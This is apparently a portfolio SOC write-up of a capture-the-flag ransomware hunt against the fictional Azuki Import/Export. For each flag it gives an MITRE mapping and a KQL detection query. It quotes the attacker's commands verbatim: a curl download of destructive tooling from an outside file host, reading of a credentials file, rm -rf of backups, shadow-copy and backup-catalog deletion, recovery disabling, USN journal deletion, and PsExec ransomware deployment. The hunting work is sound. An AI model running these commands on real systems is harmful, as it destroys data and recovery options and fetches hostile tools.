# SOC Incident Investigation – Azuki Import/Export Compromise

**Scenario:** Dead in the Water – Azuki Import/Export (梓貿易株式会社)  
**Date of Incident:** 27 November 2025  
**Data Source:** Microsoft Defender for Endpoint (Advanced Hunting)  
**Scope:** Linux Backup Server + Windows Endpoints

---

## Scope and Reporting Notes

> **Intentional Scoping Notice**  
>  
> The report for **_Dead in the Water – Azuki Import/Export_** reflects an intentional reduction in depth and presentation compared to previous threat hunt reports. This scoping decision was made to prioritize timely identification of actionable findings, preserve investigative momentum, and support transition to subsequent investigative phases.  
>  
> Accordingly, this report emphasizes key indicators, pivotal observations, and response-relevant conclusions rather than extended narrative development, exhaustive correlation, or full artifact documentation. The core analytical rigor remains intact, and the findings captured here directly informed containment considerations and follow-on investigative planning.  


---

## Executive Overview
This report documents a full ransomware intrusion lifecycle against Azuki Import/Export, from backup infrastructure compromise through ransomware deployment, recovery inhibition, persistence, and anti‑forensics. Each section corresponds to a validated CTF flag and includes:
- **What happened (finding)**
- **Why it matters (impact)**
- **MITRE ATT&CK mapping**
- **Representative KQL used to identify the activity**

This format is suitable both as a **GitHub README** and as the narrative core of a **PDF-style SOC incident report**.

---

## KQL Style (simple + consistent)

All queries below are intentionally **simple** and runnable in MDE Advanced Hunting.

**Optional (recommended):** define the in-scope devices once to reduce noise.
```kql
let AzukiDevices = dynamic(["azuki-adminpc","azuki-fileserver","azuki-logisticspc","azuki-backup"]);
```

If you don’t want a device list, replace `DeviceName in~ (AzukiDevices)` with `DeviceName contains "azuki"`.

---

## PHASE 1 – Linux Backup Server Compromise (FLAGS 1–12)

### FLAG 1 – Remote Access via SSH
**Finding:** Attackers pivoted from a compromised Windows workstation into the Linux backup server using SSH.

**Command Identified:**
```
"ssh.exe" backup-admin@10.1.0.189
```

**MITRE:** T1021.004 – Remote Services (SSH)

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName in~ (AzukiDevices)
| where FileName in~ ("ssh","ssh.exe")
| where ProcessCommandLine has "@10.1.0.189" // target backup server
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by TimeGenerated asc
```

---

### FLAG 2 – Attack Source IP
**Finding:** SSH access originated from a compromised internal workstation.

**Source IP:**
```
10.1.0.108
```

**MITRE:** T1021.004 – Remote Services

**KQL:**
```kql
DeviceNetworkEvents
| where DeviceName in~ (AzukiDevices)
| where RemoteIP == "10.1.0.189" and RemotePort == 22
| project TimeGenerated, DeviceName, LocalIP, RemoteIP, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

---

### FLAG 3 – Compromised Account
**Finding:** A privileged backup account was abused.

**Account:**
```
backup-admin
```

**MITRE:** T1078.002 – Valid Accounts (Domain / Privileged Accounts)

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName in~ (AzukiDevices)
| where AccountName == "backup-admin" or ProcessCommandLine has "backup-admin"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---

### FLAG 4 – Directory Enumeration
**Finding:** Attackers enumerated backup directory contents to identify targets.

**Command:**
```
ls --color=auto -la /backups/
```

**MITRE:** T1083 – File and Directory Discovery

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName in~ (AzukiDevices)
| where AccountName == "backup-admin"
| where FileName == "ls"
| where ProcessCommandLine == "ls --color=auto -la /backups/"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---

### FLAG 5 – File Search
**Finding:** Attackers searched for compressed backup archives to prioritize high-value targets for destruction/exfil.

**Command:**
```
find /backups -name *.tar.gz
```

**MITRE:** T1083 – File and Directory Discovery

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName in~ (AzukiDevices)
| where AccountName == "backup-admin"
| where ProcessCommandLine startswith "find /backups" and ProcessCommandLine has ".tar.gz"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---

### FLAG 6 – Local Account Enumeration
**Finding:** The attacker enumerated local Linux user accounts to understand the system’s user base and potential privilege boundaries.

**Command:**
```
cat /etc/passwd
```

**MITRE:** T1087.001 – Account Discovery (Local Account)

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName in~ (AzukiDevices)
| where AccountName == "backup-admin"
| where ProcessCommandLine == "cat /etc/passwd"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---

### FLAG 7 – Scheduled Job Reconnaissance
**Finding:** The attacker inspected cron scheduling to identify backup routines and timing.

**Command:**
```
cat /etc/crontab
```

**MITRE:** T1083 – File and Directory Discovery

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName in~ (AzukiDevices)
| where AccountName == "backup-admin"
| where ProcessCommandLine == "cat /etc/crontab"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---

### FLAG 8 – Tool Transfer
**Finding:** The attacker pulled an external archive containing destructive tooling.

**Command:**
```
curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z
```

**MITRE:** T1105 – Ingress Tool Transfer

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName in~ (AzukiDevices)
| where AccountName == "backup-admin"
| where FileName in~ ("curl","wget") or ProcessCommandLine has_any ("curl ","wget ")
| where ProcessCommandLine has "litter.catbox.moe" and ProcessCommandLine has "destroy.7z"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---

### FLAG 9 – Credential Theft
**Finding:** Plaintext credentials were accessed from backup configuration artifacts.

**Command:**
```
cat /backups/configs/all-credentials.txt
```

**MITRE:** T1552.001 – Unsecured Credentials (Credentials in Files)

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName in~ (AzukiDevices)
| where AccountName == "backup-admin"
| where ProcessCommandLine == "cat /backups/configs/all-credentials.txt"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---

### FLAG 10 – Backup Destruction
**Finding:** Backup data was deleted to eliminate recovery options before Windows ransomware deployment.

**Command (first directory path sufficient per flag instructions):**
```
rm -rf /backups/archives /backups/azuki-adminpc ...
```

**MITRE:** T1485 – Data Destruction

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName in~ (AzukiDevices)
| where AccountName == "backup-admin"
| where FileName in~ ("rm","bash","sh")
| where ProcessCommandLine startswith "rm -rf /backups/"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---

### FLAG 11 – Backup Service Stopped
**Finding:** The attacker stopped cron to immediately halt scheduled jobs (non-persistent).

**Command:**
```
systemctl stop cron
```

**MITRE:** T1489 – Service Stop

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName in~ (AzukiDevices)
| where AccountName == "backup-admin"
| where ProcessCommandLine == "systemctl stop cron"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---

### FLAG 12 – Backup Service Disabled
**Finding:** The attacker disabled cron to prevent scheduled jobs from starting on boot (persistent).

**Command:**
```
systemctl disable cron
```

**MITRE:** T1489 – Service Stop

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName in~ (AzukiDevices)
| where AccountName == "backup-admin"
| where ProcessCommandLine == "systemctl disable cron"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---

## PHASE 2 – Windows Ransomware Deployment (FLAGS 13–15)

### FLAG 13 – Remote Execution Tool
**Finding:** PsExec was used for lateral command execution over admin shares.

**Tool:**
```
PsExec64.exe
```

**MITRE:** T1021.002 – SMB / Windows Admin Shares

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName in~ (AzukiDevices)
| where FileName =~ "PsExec64.exe" or ProcessCommandLine has "PsExec64.exe"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by TimeGenerated asc
```

---

### FLAG 14 – Deployment Command
**Finding:** The attacker used PsExec to copy and execute the ransomware payload on remote systems.

**Command (password redacted):**
```
"PsExec64.exe" \10.1.0.102 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe
```

**MITRE:** T1021.002 – SMB / Windows Admin Shares

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName in~ (AzukiDevices)
| where FileName =~ "PsExec64.exe" or ProcessCommandLine has "PsExec64.exe"
| where ProcessCommandLine has "\\10.1.0.102" and ProcessCommandLine has "silentlynx.exe"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---

### FLAG 15 – Malicious Payload
**Finding:** The ransomware binary name was identified for environment-wide hunting.

**Payload:**
```
silentlynx.exe
```

**MITRE:** T1204.002 – User Execution (Malicious File)

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName in~ (AzukiDevices)
| where FileName =~ "silentlynx.exe" or ProcessCommandLine has "silentlynx.exe"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by TimeGenerated asc
```

---

## PHASE 3 – Recovery Inhibition (FLAGS 16–22)

### FLAG 16 – Shadow Service Stopped
**Finding:** The ransomware stopped the Volume Shadow Copy Service to prevent snapshot-based recovery during encryption.

**Command:**
```
"net" stop VSS /y
```

**MITRE:** T1490 – Inhibit System Recovery

**KQL:****
```kql
DeviceProcessEvents
| where DeviceName in~ (AzukiDevices)
| where ProcessCommandLine == '"net" stop VSS /y'
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---

### FLAG 17 – Backup Engine Stopped
**Finding:** Windows Backup Engine was stopped to halt backup operations and dependent services.

**Command:**
```
"net" stop wbengine /y
```

**MITRE:** T1490 – Inhibit System Recovery

**KQL (tight + time pivot around payload):**
```kql
let AzukiDevices = dynamic(["azuki-adminpc","azuki-fileserver","azuki-logisticspc","azuki-backup"]);
let AnchorTime = toscalar(
    DeviceProcessEvents
    | where DeviceName in~ (AzukiDevices)
    | where ProcessCommandLine has "silentlynx.exe"
    | summarize max(TimeGenerated)
);
let Win = 45m;
DeviceProcessEvents
| where DeviceName in~ (AzukiDevices)
| where TimeGenerated between (AnchorTime-Win .. AnchorTime+Win)
| where ProcessCommandLine == '"net" stop wbengine /y'
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---

### FLAG 18 – Process Termination (Unlock Files)
**Finding:** Database services were forcefully terminated to release file locks prior to encryption.

**Command:**
```
"taskkill" /F /IM sqlservr.exe
```

**MITRE:** T1562.001 – Impair Defenses (Disable or Modify Tools)

**KQL:****
```kql
let AzukiDevices = dynamic(["azuki-adminpc","azuki-fileserver","azuki-logisticspc","azuki-backup"]);
DeviceProcessEvents
| where DeviceName in~ (AzukiDevices)
| where ProcessCommandLine == '"taskkill" /F /IM sqlservr.exe'
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

---

### FLAG 19 – Recovery Point Deletion
**Finding:** All existing shadow copies were deleted to remove local restore points.

**Command:**
```
"vssadmin" delete shadows /all /quiet
```

**MITRE:** T1490 – Inhibit System Recovery

**KQL:****
```kql
let AzukiDevices = dynamic(["azuki-adminpc","azuki-fileserver","azuki-logisticspc","azuki-backup"]);
DeviceProcessEvents
| where DeviceName in~ (AzukiDevices)
| where ProcessCommandLine == '"vssadmin" delete shadows /all /quiet'
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---

### FLAG 20 – Storage Limitation
**Finding:** Shadow storage was resized to prevent creation of new recovery points.

**Command:**
```
"vssadmin" resize shadowstorage /for=C: /on=C: /maxsize=401MB
```

**MITRE:** T1490 – Inhibit System Recovery

**KQL (tight + command equality):**
```kql
let AzukiDevices = dynamic(["azuki-adminpc","azuki-fileserver","azuki-logisticspc","azuki-backup"]);
DeviceProcessEvents
| where DeviceName in~ (AzukiDevices)
| where ProcessCommandLine == '"vssadmin" resize shadowstorage /for=C: /on=C: /maxsize=401MB'
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---

### FLAG 21 – Recovery Disabled
**Finding:** Windows recovery features were disabled to block automatic repair after system corruption.

**Command:**
```
"bcdedit" /set {default} recoveryenabled No
```

**MITRE:** T1490 – Inhibit System Recovery

**KQL:****
```kql
let AzukiDevices = dynamic(["azuki-adminpc","azuki-fileserver","azuki-logisticspc","azuki-backup"]);
DeviceProcessEvents
| where DeviceName in~ (AzukiDevices)
| where FileName in~ ("bcdedit.exe","cmd.exe")
| where ProcessCommandLine == '"bcdedit" /set {default} recoveryenabled No'
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---

### FLAG 22 – Catalog Deletion
**Finding:** The Windows Backup catalog was deleted, making backups undiscoverable even if files remained.

**Command:**
```
"wbadmin" delete catalog -quiet
```

**MITRE:** T1490 – Inhibit System Recovery

**KQL:****
```kql
let AzukiDevices = dynamic(["azuki-adminpc","azuki-fileserver","azuki-logisticspc","azuki-backup"]);
DeviceProcessEvents
| where DeviceName in~ (AzukiDevices)
| where FileName in~ ("wbadmin.exe","cmd.exe")
| where ProcessCommandLine == '"wbadmin" delete catalog -quiet'
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated asc
```



---

## PHASE 4 – Persistence (FLAGS 23–24)

### FLAG 23 – Registry Autorun
**Finding:** A Run-key style autorun value masqueraded as a Windows security component to persist across reboots.

**Registry Value Name:**
```
WindowsSecurityHealth
```

**MITRE:** T1547.001 – Registry Run Keys / Startup Folder

**KQL (tight: only Run/RunOnce + value name):**
```kql
let AzukiDevices = dynamic(["azuki-adminpc","azuki-fileserver","azuki-logisticspc","azuki-backup"]);
DeviceRegistryEvents
| where DeviceName in~ (AzukiDevices)
| where ActionType == "RegistryValueSet"
| where RegistryKey has_any (
    "\Software\Microsoft\Windows\CurrentVersion\Run",
    "\Software\Microsoft\Windows\CurrentVersion\RunOnce"
)
| where RegistryValueName == "WindowsSecurityHealth"
| project TimeGenerated, DeviceName, RegistryKey, RegistryValueName, RegistryValueData,
          InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

---

### FLAG 24 – Scheduled Task Persistence
**Finding:** A scheduled task was created to ensure the ransomware (or helper component) re-executes reliably.

**Task Path:**
```
\Microsoft\Windows\Security\SecurityHealthService
```

**MITRE:** T1053.005 – Scheduled Task/Job

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName in~ (AzukiDevices)
| where FileName =~ "schtasks.exe" or ProcessCommandLine has "schtasks"
| where ProcessCommandLine has_any ("/create","/Create")
| where ProcessCommandLine has "SecurityHealthService"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

**KQL (registry pivot confirming the full task path):**
```kql
DeviceRegistryEvents
| where DeviceName in~ (AzukiDevices)
| where RegistryKey has "\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree"
| where RegistryKey has "\Microsoft\Windows\Security\SecurityHealthService"
| project TimeGenerated, DeviceName, ActionType, RegistryKey, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

---

## PHASE 5 – Anti‑Forensics (FLAG 25)

### FLAG 25 – Journal Deletion
**Finding:** The NTFS USN Journal was deleted to remove forensic artifacts that track file system changes.

**Command:**
```
"fsutil.exe" usn deletejournal /D C:
```

**MITRE:** T1070.004 – Indicator Removal on Host (File Deletion)

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName in~ (AzukiDevices)
| where ProcessCommandLine has_all ("fsutil","usn","deletejournal")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

---

## PHASE 6 – Ransomware Success (FLAG 26)

### FLAG 26 – Ransom Note
**Finding:** Ransom note artifacts confirm successful encryption and provide attacker instructions.

**Filename:**
```
SILENTLYNX_README.txt
```

**MITRE:** T1486 – Data Encrypted for Impact

**KQL:**
```kql
DeviceFileEvents
| where DeviceName in~ (AzukiDevices)
| where FileName == "SILENTLYNX_README.txt"
| project TimeGenerated, DeviceName, ActionType, FolderPath, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

---

## Conclusion
This incident demonstrates a **methodical, multi‑stage ransomware operation** with deliberate focus on:
- Backup and recovery destruction **before** encryption
- Rapid lateral deployment via admin tooling
- Persistent access and anti‑forensic cleanup

The attacker achieved full operational impact with minimal resistance, underscoring gaps in backup isolation, credential hygiene, and endpoint monitoring.

---

*Prepared as a SOC investigation walkthrough and portfolio‑ready incident report.*

